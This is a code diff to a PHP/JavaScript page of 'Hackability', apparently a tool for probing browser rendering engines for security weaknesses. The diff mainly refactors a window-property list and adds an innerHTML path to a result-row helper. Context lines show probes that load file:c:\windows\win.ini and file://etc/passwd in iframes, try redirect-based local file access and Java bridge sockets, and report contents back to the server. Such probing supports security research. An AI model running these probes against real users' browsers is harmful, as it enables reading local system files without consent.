@@ -11,8 +11,9 @@ if($pathInfo['dirname'] !== '/') {
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
 <link href="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/css-link.css?info_css_link" rel="StyleSheet" />
 <style>@import 'http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/css-import.css?info_css_import';</style>
+<script src="inspector/js/inspector.js"></script>
 <script>
-window.Hackability = {};	
+window.Hackability = {};
 </script>
 <script>
 if (!document.querySelectorAll && !document.querySelector) {
@@ -163,7 +164,7 @@ Hackability.generateRequestUrl = function(type) {
     			<tr>
     				<td width=50 height=51 valign=top><object data="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tick.html?info_activex&<?php echo time();?>" width=51 height=50 classid="clsid:25336920-03F9-11cf-8FD0-00AA00686F13">
       				<span style="color:red">No</span>
-      				</object>		
+      				</object>
   				</td>
     				<td valign=top>ActiveX</td>
     			</tr>
@@ -171,21 +172,21 @@ Hackability.generateRequestUrl = function(type) {
     				<td width=50 height=51 valign=top><object data="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>img/tick.swf?info_flash&<?php echo time();?>" width=11 height=10 type="application/x-shockwave-flash">
       				<param name="movie" value="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>img/tick.swf?info_flash&<?php echo time();?>" />
       				<span style="color:red">No</span>
-      				</object>		
+      				</object>
   				</td>
     				<td valign=top>Flash</td>
     			</tr>
     			<tr>
     				<td width=50 height=51 valign=top><object data="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>img/tick.pdf?info_pdf&<?php echo time();?>" width=151 height=150 type="application/pdf">
       				<span style="color:red">No</span>
-      				</object>		
+      				</object>
   				</td>
     				<td valign=top>PDF</td>
     			</tr>
     			<tr>
     				<td width=50 height=51 valign=top><applet width=151 height=150 codebase="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>img/" code="tick.class" width=151 height=150>
       				<span style="color:red">No</span>
-      				</applet>		
+      				</applet>
   				</td>
     				<td valign=top>Java</td>
     			</tr>
@@ -203,7 +204,7 @@ Hackability.generateRequestUrl = function(type) {
     			</tr>
     		</thead>
     		<tbody>
-    			
+
     		</tbody>
     	</table>
   </td>
@@ -212,9 +213,9 @@ Hackability.generateRequestUrl = function(type) {
 </div>
 <div class="render"></div>
 <script>
-Hackability.generateRow = function(status, text) {
+Hackability.generateRow = function(status, text, html) {
 	var tbody = document.querySelector('.javascriptTests tbody'), tr, td, td2;
-	tr = document.createElement('tr'); 
+	tr = document.createElement('tr');
 	td = document.createElement('td');
 	td.width=50;
 	td.height=51;
@@ -225,8 +226,12 @@ Hackability.generateRow = function(status, text) {
 		td.innerHTML = '<span style="color:red">No</span>';
 	}
 	td2 = document.createElement('td');
-	td2.appendChild(document.createTextNode(text));
-	tr.appendChild(td);
+  if(html) {
+    td2.innerHTML = html;
+  } else {
+    td2.appendChild(document.createTextNode(text));
+  }
+  tr.appendChild(td);
 	tr.appendChild(td2);
 	tbody.appendChild(tr);
 }
@@ -260,7 +265,7 @@ Hackability.generateRow = function(status, text) {
 <script>
 !function(){
 	function jsEnvironmentCheck() {
-var props = 'Hackability,orientation,onorientationchange,ontouchcancel,ontouchend,ontouchmove,ontouchstart,BluetoothUUID,BluetoothRemoteGATTService,BluetoothRemoteGATTServer,BluetoothRemoteGATTDescriptor,BluetoothRemoteGATTCharacteristic,BluetoothDevice,BluetoothCharacteristicProperties,Bluetooth,NavigationPreloadManager,PresentationReceiver,PresentationConnectionList,PaymentResponse,PaymentRequestUpdateEvent,PaymentRequest,PaymentAddress,PhotoCapabilities,MediaSettingsRange,ImageCapture,BudgetService,RTCRtpContributingSource,WritableStream,PerformancePaintTiming,onmessageerror,clipboardData,maxConnectionsPerServer,onhelp,onanimationcancel,toStaticHTML,VRStageParameters,AnimationTimeline,AnimationEffectReadOnly,CSSPseudoElement,AnimationEffectTimingReadOnly,KeyframeEffectReadOnly,KeyframeEffect,CSSTransition,CSSAnimation,AnimationPlaybackEvent,AnimationEffectTiming,GamepadAxisMoveEvent,GamepadButtonEvent,DocumentTimeline,WebKitMediaKeyNeededEvent,OverconstrainedError,OverconstrainedErrorEvent,onwebkitwillrevealbottom,onwebkitwillrevealleft,onwebkitwillrevealright,onwebkitwillrevealtop,origin,Atomics,SharedArrayBuffer,StaticRange,safari,0,1,2,3,4,5,6,7,8,9,10,11,GamepadHapticActuator,GamepadPose,VRDisplay,VRDisplayCapabilities,VRDisplayEvent,VREyeParameters,VRFieldOfView,VRFrameData,VRPose,onvrdisplayactivate,onvrdisplayblur,onvrdisplayconnect,onvrdisplaydeactivate,onvrdisplaydisconnect,onvrdisplayfocus,onvrdisplaypointerrestricted,onvrdisplaypointerunrestricted,onvrdisplaypresentchange,ondragexit,onloadend,onselectstart,ontransitioncancel,ontransitionrun,ontransitionstart,RTCDTMFSender,FileSystem,FileSystemEntry,FileSystemFileEntry,FileSystemDirectoryReader,FileSystemDirectoryEntry,WebGL2RenderingContext,RemotePlayback,WebGLVertexArrayObject,RTCDataChannel,ConstantSourceNode,BaseAudioContext,AudioScheduledSourceNode,WebAssembly,TaskAttributionTiming,PerformanceLongTaskTiming,ongotpointercapture,onlostpointercapture,ANGLE_instanced_arrays,ActiveXObject,AesGcmEncryptResult,AnalyserNode,Animation,AnimationEvent,AppBannerPromptResult,ApplePaySession,ApplicationCache,ApplicationCacheErrorEvent,Array,ArrayBuffer,Attr,Audio,AudioBuffer,AudioBufferSourceNode,AudioContext,AudioDestinationNode,AudioListener,AudioNode,AudioParam,AudioProcessingEvent,AudioStreamTrack,AudioTrack,AudioTrackList,BarProp,BatteryManager,BeforeInstallPromptEvent,BeforeLoadEvent,BeforeUnloadEvent,BhxBrowser,BhxEvent,BhxFilteredEvent,BhxWebNavigation,BhxWebRequest,BiquadFilterNode,Blob,BlobEvent,BookmarkCollection,Boolean,BroadcastChannel,ByteLengthQueuingStrategy,CDATASection,CSS,CSS2Properties,CSSCharsetRule,CSSConditionRule,CSSCounterStyleRule,CSSFontFaceRule,CSSFontFeatureValuesRule,CSSGroupingRule,CSSImportRule,CSSKeyframeRule,CSSKeyframesRule,CSSMediaRule,CSSMozDocumentRule,CSSNameSpaceRule,CSSNamespaceRule,CSSPageRule,CSSPrimitiveValue,CSSRule,CSSRuleList,CSSStyleDeclaration,CSSStyleRule,CSSStyleSheet,CSSSupportsRule,CSSValue,CSSValueList,CSSViewportRule,Cache,CacheStorage,CanvasCaptureMediaStream,CanvasCaptureMediaStreamTrack,CanvasGradient,CanvasPattern,CanvasPixelArray,CanvasRenderingContext2D,CaretPosition,ChannelMergerNode,ChannelSplitterNode,CharacterData,ClientRect,ClientRectList,ClipboardEvent,CloseEvent,CollectGarbage,CommandEvent,Comment,CompositionEvent,Console,ControlRangeCollection,Controllers,ConvolverNode,Coordinates,CountQueuingStrategy,Counter,Credential,CredentialsContainer,Crypto,CryptoKey,CryptoKeyPair,CryptoOperation,CustomElementRegistry,CustomEvent,DOMCursor,DOMError,DOMException,DOMImplementation,DOMMatrix,DOMMatrixReadOnly,DOMParser,DOMPoint,DOMPointReadOnly,DOMQuad,DOMRect,DOMRectList,DOMRectReadOnly,DOMRequest,DOMSettableTokenList,DOMStringList,DOMStringMap,DOMTokenList,DOMTransactionEvent,DataChannel,DataCue,DataTransfer,DataTransferItem,DataTransferItemList,DataView,Database,Date,Debug,DelayNode,DesktopNotification,DesktopNotificationCenter,DeviceAcceleration,DeviceLightEvent,DeviceMotionEvent,DeviceOrientationEvent,DeviceProximityEvent,DeviceRotationRate,Directory,Document,DocumentFragment,DocumentType,DragEvent,DynamicsCompressorNode,EXT_frag_depth,EXT_texture_filter_anisotropic,Element,Enumerator,Error,ErrorEvent,EvalError,Event,EventException,EventSource,EventTarget,External,FederatedCredential,File,FileError,FileList,FileReader,Float32Array,Float64Array,FocusEvent,FontFace,FontFaceSet,FontFaceSetLoadEvent,FormData,Function,GainNode,Gamepad,GamepadButton,GamepadEvent,Geolocation,GestureEvent,HTMLAllCollection,HTMLAnchorElement,HTMLAppletElement,HTMLAreaElement,HTMLAreasCollection,HTMLAttachmentElement,HTMLAudioElement,HTMLBGSoundElement,HTMLBRElement,HTMLBaseElement,HTMLBaseFontElement,HTMLBlockElement,HTMLBodyElement,HTMLButtonElement,HTMLCanvasElement,HTMLCollection,HTMLContentElement,HTMLDDElement,HTMLDListElement,HTMLDTElement,HTMLDataElement,HTMLDataListElement,HTMLDetailsElement,HTMLDialogElement,HTMLDirectoryElement,HTMLDivElement,HTMLDocument,HTMLElement,HTMLEmbedElement,HTMLFieldSetElement,HTMLFontElement,HTMLFormControlsCollection,HTMLFormElement,HTMLFrameElement,HTMLFrameSetElement,HTMLHRElement,HTMLHeadElement,HTMLHeadingElement,HTMLHtmlElement,HTMLIFrameElement,HTMLImageElement,HTMLInputElement,HTMLIsIndexElement,HTMLKeygenElement,HTMLLIElement,HTMLLabelElement,HTMLLegendElement,HTMLLinkElement,HTMLMapElement,HTMLMarqueeElement,HTMLMediaElement,HTMLMenuElement,HTMLMenuItemElement,HTMLMetaElement,HTMLMeterElement,HTMLModElement,HTMLNextIdElement,HTMLOListElement,HTMLObjectElement,HTMLOptGroupElement,HTMLOptionElement,HTMLOptionsCollection,HTMLOutputElement,HTMLParagraphElement,HTMLParamElement,HTMLPhraseElement,HTMLPictureElement,HTMLPreElement,HTMLProgressElement,HTMLQuoteElement,HTMLScriptElement,HTMLSelectElement,HTMLShadowElement,HTMLSlotElement,HTMLSourceElement,HTMLSpanElement,HTMLStyleElement,HTMLTableCaptionElement,HTMLTableCellElement,HTMLTableColElement,HTMLTableDataCellElement,HTMLTableElement,HTMLTableHeaderCellElement,HTMLTableRowElement,HTMLTableSectionElement,HTMLTemplateElement,HTMLTextAreaElement,HTMLTimeElement,HTMLTitleElement,HTMLTrackElement,HTMLUListElement,HTMLUnknownElement,HTMLVideoElement,HashChangeEvent,Headers,History,IDBCursor,IDBCursorWithValue,IDBDatabase,IDBFactory,IDBFileHandle,IDBFileRequest,IDBIndex,IDBKeyRange,IDBMutableFile,IDBObjectStore,IDBOpenDBRequest,IDBRequest,IDBTransaction,IDBVersionChangeEvent,IIRFilterNode,IdleDeadline,Image,ImageBitmap,ImageBitmapRenderingContext,ImageData,Infinity,InputDeviceCapabilities,InputEvent,InstallTrigger,Int16Array,Int32Array,Int8Array,InternalError,IntersectionObserver,IntersectionObserverEntry,Intl,Iterator,JSON,Key,KeyEvent,KeyOperation,KeyPair,KeyboardEvent,LocalMediaStream,Location,MIDIAccess,MIDIConnectionEvent,MIDIInput,MIDIInputMap,MIDIMessageEvent,MIDIOutput,MIDIOutputMap,MIDIPort,MSAssertion,MSBehaviorUrnsCollection,MSBlobBuilder,MSCSSMatrix,MSCSSProperties,MSCSSRuleList,MSCompatibleInfo,MSCompatibleInfoCollection,MSCredentials,MSCurrentStyleCSSProperties,MSEventObj,MSFIDOCredentialAssertion,MSFIDOSignature,MSFIDOSignatureAssertion,MSGesture,MSGestureEvent,MSGraphicsTrust,MSInputMethodContext,MSManipulationEvent,MSMediaKeyError,MSMediaKeyMessageEvent,MSMediaKeyNeededEvent,MSMediaKeySession,MSMediaKeys,MSMimeTypesCollection,MSPluginsCollection,MSPointerEvent,MSRangeCollection,MSSiteModeEvent,MSStream,MSStreamReader,MSStyleCSSProperties,Map,Math,MediaController,MediaDeviceInfo,MediaDevices,MediaElementAudioSourceNode,MediaEncryptedEvent,MediaError,MediaKeyError,MediaKeyEvent,MediaKeyMessageEvent,MediaKeyNeededEvent,MediaKeySession,MediaKeyStatusMap,MediaKeySystemAccess,MediaKeys,MediaList,MediaQueryList,MediaQueryListEvent,MediaRecorder,MediaSource,MediaStream,MediaStreamAudioDestinationNode,MediaStreamAudioSourceNode,MediaStreamError,MediaStreamErrorEvent,MediaStreamEvent,MediaStreamTrack,MediaStreamTrackEvent,MessageChannel,MessageEvent,MessagePort,MimeType,MimeTypeArray,MouseEvent,MouseScrollEvent,MouseWheelEvent,MutationEvent,MutationObserver,MutationRecord,NaN,NamedNodeMap,Navigator,Node,NodeFilter,NodeIterator,NodeList,Notification,NotifyPaintEvent,Number,OES_element_index_uint,OES_standard_derivatives,OES_texture_float,OES_texture_float_linear,OES_texture_half_float,OES_texture_half_float_linear,Object,OfflineAudioCompletionEvent,OfflineAudioContext,OfflineResourceList,Option,OscillatorNode,OverflowEvent,PageTransitionEvent,PaintRequest,PaintRequestList,PannerNode,PasswordCredential,Path2D,Performance,PerformanceEntry,PerformanceMark,PerformanceMeasure,PerformanceNavigation,PerformanceNavigationTiming,PerformanceObserver,PerformanceObserverEntryList,PerformanceResourceTiming,PerformanceTiming,PeriodicWave,PermissionStatus,Permissions,Plugin,PluginArray,PointerEvent,PopStateEvent,PopupBlockedEvent,Position,PositionError,Presentation,PresentationAvailability,PresentationConnection,PresentationConnectionAvailableEvent,PresentationConnectionCloseEvent,PresentationRequest,ProcessingInstruction,ProgressEvent,Promise,PromiseRejectionEvent,Proxy,PushManager,PushSubscription,PushSubscriptionOptions,RGBColor,RTCCertificate,RTCDTMFToneChangeEvent,RTCDataChannelEvent,RTCDtlsTransport,RTCDtlsTransportStateChangedEvent,RTCDtmfSender,RTCIceCandidate,RTCIceCandidatePairChangedEvent,RTCIceGatherer,RTCIceGathererEvent,RTCIceTransport,RTCIceTransportStateChangedEvent,RTCPeerConnection,RTCPeerConnectionIceEvent,RTCRtpReceiver,RTCRtpSender,RTCSessionDescription,RTCSrtpSdesTransport,RTCSsrcConflictEvent,RTCStatsProvider,RTCStatsReport,RTCTrackEvent,RadioNodeList,Range,RangeError,RangeException,ReadableStream,ReadableStreamReader,RecordErrorEvent,Rect,ReferenceError,Reflect,RegExp,Request,Response,SQLError,SQLException,SQLResultSet,SQLResultSetRowList,SQLTransaction,SVGAElement,SVGAltGlyphDefElement,SVGAltGlyphElement,SVGAltGlyphItemElement,SVGAngle,SVGAnimateColorElement,SVGAnimateElement,SVGAnimateMotionElement,SVGAnimateTransformElement,SVGAnimatedAngle,SVGAnimatedBoolean,SVGAnimatedEnumeration,SVGAnimatedInteger,SVGAnimatedLength,SVGAnimatedLengthList,SVGAnimatedNumber,SVGAnimatedNumberList,SVGAnimatedPreserveAspectRatio,SVGAnimatedRect,SVGAnimatedString,SVGAnimatedTransformList,SVGAnimationElement,SVGCircleElement,SVGClipPathElement,SVGColor,SVGComponentTransferFunctionElement,SVGCursorElement,SVGDefsElement,SVGDescElement,SVGDiscardElement,SVGDocument,SVGElement,SVGElementInstance,SVGElementInstanceList,SVGEllipseElement,SVGException,SVGFEBlendElement,SVGFEColorMatrixElement,SVGFEComponentTransferElement,SVGFECompositeElement,SVGFEConvolveMatrixElement,SVGFEDiffuseLightingElement,SVGFEDisplacementMapElement,SVGFEDistantLightElement,SVGFEDropShadowElement,SVGFEFloodElement,SVGFEFuncAElement,SVGFEFuncBElement,SVGFEFuncGElement,SVGFEFuncRElement,SVGFEGaussianBlurElement,SVGFEImageElement,SVGFEMergeElement,SVGFEMergeNodeElement,SVGFEMorphologyElement,SVGFEOffsetElement,SVGFEPointLightElement,SVGFESpecularLightingElement,SVGFESpotLightElement,SVGFETileElement,SVGFETurbulenceElement,SVGFilterElement,SVGFontElement,SVGFontFaceElement,SVGFontFaceFormatElement,SVGFontFaceNameElement,SVGFontFaceSrcElement,SVGFontFaceUriElement,SVGForeignObjectElement,SVGGElement,SVGGeometryElement,SVGGlyphElement,SVGGlyphRefElement,SVGGradientElement,SVGGraphicsElement,SVGHKernElement,SVGImageElement,SVGLength,SVGLengthList,SVGLineElement,SVGLinearGradientElement,SVGMPathElement,SVGMarkerElement,SVGMaskElement,SVGMatrix,SVGMetadataElement,SVGMissingGlyphElement,SVGNumber,SVGNumberList,SVGPaint,SVGPathElement,SVGPathSeg,SVGPathSegArcAbs,SVGPathSegArcRel,SVGPathSegClosePath,SVGPathSegCurvetoCubicAbs,SVGPathSegCurvetoCubicRel,SVGPathSegCurvetoCubicSmoothAbs,SVGPathSegCurvetoCubicSmoothRel,SVGPathSegCurvetoQuadraticAbs,SVGPathSegCurvetoQuadraticRel,SVGPathSegCurvetoQuadraticSmoothAbs,SVGPathSegCurvetoQuadraticSmoothRel,SVGPathSegLinetoAbs,SVGPathSegLinetoHorizontalAbs,SVGPathSegLinetoHorizontalRel,SVGPathSegLinetoRel,SVGPathSegLinetoVerticalAbs,SVGPathSegLinetoVerticalRel,SVGPathSegList,SVGPathSegMovetoAbs,SVGPathSegMovetoRel,SVGPatternElement,SVGPoint,SVGPointList,SVGPolygonElement,SVGPolylineElement,SVGPreserveAspectRatio,SVGRadialGradientElement,SVGRect,SVGRectElement,SVGRenderingIntent,SVGSVGElement,SVGScriptElement,SVGSetElement,SVGStopElement,SVGStringList,SVGStyleElement,SVGSwitchElement,SVGSymbolElement,SVGTRefElement,SVGTSpanElement,SVGTextContentElement,SVGTextElement,SVGTextPathElement,SVGTextPositioningElement,SVGTitleElement,SVGTransform,SVGTransformList,SVGUnitTypes,SVGUseElement,SVGVKernElement,SVGViewElement,SVGViewSpec,SVGZoomAndPan,SVGZoomEvent,Screen,ScreenOrientation,ScriptEngine,ScriptEngineBuildVersion,ScriptEngineMajorVersion,ScriptEngineMinorVersion,ScriptProcessorNode,ScrollAreaEvent,SecurityPolicyViolationEvent,Selection,ServiceWorker,ServiceWorkerContainer,ServiceWorkerMessageEvent,ServiceWorkerRegistration,Set,ShadowRoot,SharedWorker,SimpleGestureEvent,SiteBoundCredential,SourceBuffer,SourceBufferList,SpeechSynthesis,SpeechSynthesisErrorEvent,SpeechSynthesisEvent,SpeechSynthesisUtterance,SpeechSynthesisVoice,StereoPannerNode,StopIteration,Storage,StorageEvent,StorageManager,String,StyleMedia,StyleSheet,StyleSheetList,StyleSheetPageList,SubtleCrypto,Symbol,SyncManager,SyntaxError,Text,TextDecoder,TextEncoder,TextEvent,TextMetrics,TextRange,TextRangeCollection,TextTrack,TextTrackCue,TextTrackCueList,TextTrackList,TimeEvent,TimeRanges,Touch,TouchEvent,TouchList,TrackEvent,TransitionEvent,TreeWalker,TypeError,UIEvent,URIError,URL,URLSearchParams,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray,UserMessageHandler,UserMessageHandlersNamespace,UserProximityEvent,VBArray,VTTCue,VTTRegion,ValidityState,VideoPlaybackQuality,VideoStreamTrack,VideoTrack,VideoTrackList,WEBGL_compressed_texture_s3tc,WEBGL_debug_renderer_info,WEBGL_depth_texture,WaveShaperNode,WeakMap,WeakSet,WebGLActiveInfo,WebGLBuffer,WebGLContextEvent,WebGLFramebuffer,WebGLObject,WebGLProgram,WebGLQuery,WebGLRenderbuffer,WebGLRenderingContext,WebGLSampler,WebGLShader,WebGLShaderPrecisionFormat,WebGLSync,WebGLTexture,WebGLTransformFeedback,WebGLUniformLocation,WebKitAnimationEvent,WebKitCSSFilterValue,WebKitCSSMatrix,WebKitCSSRegionRule,WebKitCSSTransformValue,WebKitDataCue,WebKitDirectoryEntry,WebKitDirectoryReader,WebKitEntry,WebKitFileEntry,WebKitFileSystem,WebKitMediaKeyError,WebKitMediaKeyMessageEvent,WebKitMediaKeySession,WebKitMediaKeys,WebKitMutationObserver,WebKitNamespace,WebKitPlaybackTargetAvailabilityEvent,WebKitPoint,WebKitTransitionEvent,WebSocket,WheelEvent,Window,Worker,XMLDocument,XMLHttpRequest,XMLHttpRequestEventTarget,XMLHttpRequestProgressEvent,XMLHttpRequestUpload,XMLSerializer,XMLStylesheetProcessingInstruction,XPathEvaluator,XPathException,XPathExpression,XPathNSResolver,XPathResult,XSLTProcessor,alert,applicationCache,atob,blur,btoa,caches,cancelAnimationFrame,cancelIdleCallback,captureEvents,chrome,clearImmediate,clearInterval,clearTimeout,clientInformation,close,closed,confirm,console,content,createImageBitmap,crypto,customElements,decodeURI,decodeURIComponent,defaultStatus,defaultstatus,devicePixelRatio,doNotTrack,document,dump,encodeURI,encodeURIComponent,escape,eval,event,external,fetch,find,focus,frameElement,frames,fullScreen,getComputedStyle,getDefaultComputedStyle,getMatchedCSSRules,getSelection,history,indexedDB,innerHeight,innerWidth,isFinite,isNaN,isSecureContext,localStorage,location,locationbar,matchMedia,menubar,moveBy,moveTo,mozInnerScreenX,mozInnerScreenY,mozPaintCount,mozRTCIceCandidate,mozRTCPeerConnection,mozRTCSessionDescription,msCredentials,msWriteProfilerMark,name,navigator,netscape,offscreenBuffering,onabort,onabsolutedeviceorientation,onafterprint,onanimationend,onanimationiteration,onanimationstart,onauxclick,onbeforeprint,onbeforeunload,onblur,oncancel,oncanplay,oncanplaythrough,onchange,onclick,onclose,oncompassneedscalibration,oncontextmenu,oncuechange,ondblclick,ondevicelight,ondevicemotion,ondeviceorientation,ondeviceorientationabsolute,ondeviceproximity,ondrag,ondragend,ondragenter,ondragleave,ondragover,ondragstart,ondrop,ondurationchange,onemptied,onended,onerror,onfocus,onhashchange,oninput,oninvalid,onkeydown,onkeypress,onkeyup,onlanguagechange,onload,onloadeddata,onloadedmetadata,onloadstart,onmessage,onmousedown,onmouseenter,onmouseleave,onmousemove,onmouseout,onmouseover,onmouseup,onmousewheel,onmozfullscreenchange,onmozfullscreenerror,onmsgesturechange,onmsgesturedoubletap,onmsgestureend,onmsgesturehold,onmsgesturestart,onmsgesturetap,onmsinertiastart,onoffline,ononline,onpagehide,onpageshow,onpause,onplay,onplaying,onpointercancel,onpointerdown,onpointerenter,onpointerleave,onpointermove,onpointerout,onpointerover,onpointerup,onpopstate,onprogress,onratechange,onreadystatechange,onrejectionhandled,onreset,onresize,onscroll,onsearch,onseeked,onseeking,onselect,onshow,onstalled,onstorage,onsubmit,onsuspend,ontimeupdate,ontoggle,ontransitionend,onunhandledrejection,onunload,onuserproximity,onvolumechange,onwaiting,onwebkitanimationend,onwebkitanimationiteration,onwebkitanimationstart,onwebkitmouseforcechanged,onwebkitmouseforcedown,onwebkitmouseforceup,onwebkitmouseforcewillbegin,onwebkittransitionend,onwheel,open,openDatabase,opener,outerHeight,outerWidth,pageXOffset,pageYOffset,parent,parseFloat,parseInt,performance,personalbar,postMessage,print,prompt,releaseEvents,requestAnimationFrame,requestIdleCallback,resizeBy,resizeTo,screen,screenLeft,screenTop,screenX,screenY,scroll,scrollBy,scrollByLines,scrollByPages,scrollMaxX,scrollMaxY,scrollTo,scrollX,scrollY,scrollbars,self,sessionStorage,setImmediate,setInterval,setResizable,setTimeout,showModalDialog,sidebar,sizeToContent,speechSynthesis,status,statusbar,stop,styleMedia,toString,toolbar,top,undefined,unescape,uneval,updateCommands,webkitAudioContext,webkitAudioPannerNode,webkitCancelAnimationFrame,webkitCancelRequestAnimationFrame,webkitConvertPointFromNodeToPage,webkitConvertPointFromPageToNode,webkitIDBCursor,webkitIDBDatabase,webkitIDBFactory,webkitIDBIndex,webkitIDBKeyRange,webkitIDBObjectStore,webkitIDBRequest,webkitIDBTransaction,webkitIndexedDB,webkitMediaStream,webkitNotifications,webkitOfflineAudioContext,webkitRTCPeerConnection,webkitRequestAnimationFrame,webkitRequestFileSystem,webkitResolveLocalFileSystemURL,webkitSpeechGrammar,webkitSpeechGrammarList,webkitSpeechRecognition,webkitSpeechRecognitionError,webkitSpeechRecognitionEvent,webkitStorageInfo,webkitURL,window,length'.split(','), foundProps = Object.getOwnPropertyNames(window), i, j, diff = [], found;
+var props = Inspector.getKnownWindowProps().concat(['Inspector','Hackability']), foundProps = Object.getOwnPropertyNames(window), i, j, diff = [], found;
 		for(i=0;i<foundProps.length;i++) {
 			found = false;
 			for(j=0;j<props.length;j++) {
@@ -273,7 +278,7 @@ var props = 'Hackability,orientation,onorientationchange,ontouchcancel,ontouchen
 				diff.push(foundProps[i]);
 			}
 		}
-		
+
 		if(diff.length) {
 			Hackability.makeRequest("exploit_js_environment_difference&props="+diff.join(','));
 			Hackability.generateRow(true, "JavaScript environment difference:"+diff.join(','));
@@ -375,7 +380,7 @@ var props = 'Hackability,orientation,onorientationchange,ontouchcancel,ontouchen
 			if(obj[i] && typeof obj[i] === 'object')
 			try {
 				obj[i].getClass().forName("java.net.Socket").newInstance();
-				foundConstructor = true; 
+				foundConstructor = true;
 				Hackability.makeRequest("exploit_java_bridge&class="+encodeURIComponent(obj[i].getClass().getName()));
 				Hackability.generateRow(true, "Java Bridge exists:class="+obj[i].getClass().getName()+', path='+path+'.'+i);
 				return false;
@@ -407,7 +412,7 @@ var props = 'Hackability,orientation,onorientationchange,ontouchcancel,ontouchen
 					Hackability.generateRow(false, "Java Bridge does not exist");
 				}
 			},2000);
-		});		
+		});
 	}
 }();
 </script>
@@ -447,7 +452,7 @@ if(Object.defineProperty) {
 	Hackability.generateRow(true, "ES5 is supported");
 } else {
 	Hackability.makeRequest("info_es5_is_not_supported");
-	Hackability.generateRow(false, "ES5 is not supported");	
+	Hackability.generateRow(false, "ES5 is not supported");
 }
 </script>
 <script>
@@ -477,13 +482,13 @@ if('\u' === 'u') {
 <script>
 if(window.Components) {
 	Hackability.makeRequest("info_mozilla_like");
-	Hackability.generateRow(true, "Mozilla like behaviour");	
+	Hackability.generateRow(true, "Mozilla like behaviour");
 }
 </script>
 <script>
 !function(){
 	if(top.location != self.location) {
-		var loc = '', contents = '';	
+		var loc = '', contents = '';
 		try {
 			loc = top.location;
 		} catch(e){}
@@ -651,7 +656,7 @@ Hackability.iframe_handler = function(iframe, type, msg){
 	if(!/IGNORE THIS CONTENTS/i.test(contents) && isInterestingUrl(url) && contents.length) {
 		Hackability.makeRequest(type+'?&url='+encodeURIComponent(url)+'&contents='+encodeURIComponent(contents));
 		Hackability.generateRow(true,msg+':url='+url+', contents='+contents);
-	} 
+	}
 };
 </script>
 <script>
@@ -710,43 +715,43 @@ Hackability.runExploits = function() {
 	}
   q.push(function(){
     try {
-      Hackability.createIframe('file:c:\\windows\\win.ini', 'Iframe security filesystem windows bypassed', 'exploit_local_file_iframe_windows'); 
-    } catch(e){console.log(e);} 
+      Hackability.createIframe('file:c:\\windows\\win.ini', 'Iframe security filesystem windows bypassed', 'exploit_local_file_iframe_windows');
+    } catch(e){console.log(e);}
   });
 	q.push(function(){
 	 try {
     Hackability.createIframe('file://etc/passwd', 'Iframe security filesystem linux bypassed', 'exploit_local_file_iframe_linux');
-   } catch(e){console.log(e);} 
+   } catch(e){console.log(e);}
 	});
   q.push(function(){
     try {
       Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=http&os=windows','Iframe security filesystem windows redirect bypassed','exploit_local_file_iframe_redirect_windows');
-    } catch(e){console.log(e);} 
+    } catch(e){console.log(e);}
 	});
   q.push(function(){
     try {
       Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=http&os=linux','Iframe security filesystem linux redirect bypassed','exploit_local_file_iframe_redirect_linux');
-    } catch(e){console.log(e);}  
+    } catch(e){console.log(e);}
 	});
   q.push(function(){
     try {
       Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=meta&os=windows','Iframe security filesystem windows meta redirect bypassed','exploit_local_file_iframe_redirect_windows');
-    } catch(e){console.log(e);} 
+    } catch(e){console.log(e);}
 	});
   q.push(function(){
     try {
       Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=meta&os=linux','Iframe security filesystem linux meta redirect bypassed','exploit_local_file_iframe_redirect_linux');
-    } catch(e){console.log(e);} 
+    } catch(e){console.log(e);}
 	});
   q.push(function(){
     try {
       Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=javascript&os=windows','Iframe security filesystem windows js redirect bypassed','exploit_local_file_iframe_redirect_windows');
-    } catch(e){console.log(e);} 
+    } catch(e){console.log(e);}
 	});
   q.push(function(){
     try {
       Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=javascript&os=linux','Iframe security filesystem linux js redirect bypassed','exploit_local_file_iframe_redirect_linux');
-    } catch(e){console.log(e);} 
+    } catch(e){console.log(e);}
   });
   setTimeout(function f(){
       if(q.length) {
@@ -765,14 +770,14 @@ if(window.addEventListener) {
 			Hackability.runExploits();
       Hackability.print();
 		}, 5000);
-	}, false); 
+	}, false);
 } else if(window.attachEvent) {
 	window.attachEvent('onload', function(){
 		setTimeout(function(){
 			Hackability.runExploits();
       Hackability.print();
 		}, 5000);
-	}); 
+	});
 }
 </script>
 </body>
